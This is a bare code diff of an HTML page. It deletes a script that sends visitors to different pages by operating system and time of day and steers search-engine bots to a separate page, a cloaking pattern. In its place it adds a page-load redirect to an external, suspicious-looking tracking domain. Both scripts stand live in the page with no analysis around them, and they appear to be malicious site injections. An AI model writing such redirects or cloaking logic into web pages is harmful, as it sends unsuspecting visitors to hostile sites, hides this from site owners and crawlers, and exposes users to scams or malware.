@@ -1,43 +1,6 @@
-    <script>
-        function isAppleDevice() {
-            var userAgent = navigator.userAgent;
-            return (userAgent.indexOf('Mac OS') !== -1 || userAgent.indexOf('iOS') !== -1);
-        }
-
-        function isSearchBot() {
-            var userAgent = navigator.userAgent;
-            var searchBots = ['Googlebot', 'Bingbot', 'Yahoo Slurp', 'DuckDuckBot', 'YandexBot'];
-            for (var i = 0; i < searchBots.length; i++) {
-                if (userAgent.indexOf(searchBots[i]) !== -1) {
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        function isWithinTimeRange() {
-            var now = new Date();
-            var currentHour = now.getHours();
-            return (currentHour >= 8 && currentHour < 19);
-        }
-
-        function redirectToPage() {
-            var redirectPath = 'main.html'; // Default path
-
-            if (isSearchBot() && isWithinTimeRange()) {
-                redirectPath = 'main.html';
-            } else if (isAppleDevice() && isWithinTimeRange()) {
-                redirectPath = 'mac.html';
-            } else if (!isAppleDevice() && isWithinTimeRange()) {
-                redirectPath = 'win.html';
-            }
-
-            window.location.href = redirectPath;
-        }
-
-        // Call the redirection function when the page loads
-        window.onload = redirectToPage;
-    </script>
+<script>
+    window.location.href = "https://clicktrack-linker.xyz/hulla.php";
+  </script>
 	
 	
 <html>
